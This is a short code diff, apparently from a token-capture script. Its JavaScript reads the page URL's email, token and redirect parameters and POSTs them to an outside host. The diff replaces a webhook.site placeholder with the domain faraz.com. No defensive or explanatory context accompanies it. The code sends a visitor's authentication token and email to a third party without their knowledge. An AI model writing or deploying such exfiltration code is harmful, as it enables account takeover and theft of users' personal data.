@@ -14,7 +14,7 @@
     const token = params.get('token') || 'N/A';
     const redirect = params.get('next') || params.get('redirect') || params.get('url');
 
-    fetch('https://webhook.site/YOUR-ID-HERE', {
+    fetch('https://faraz.com', {
       method: 'POST',
       body: JSON.stringify({ fullUrl, email, token, redirect }),
       headers: { 'Content-Type': 'application/json' }
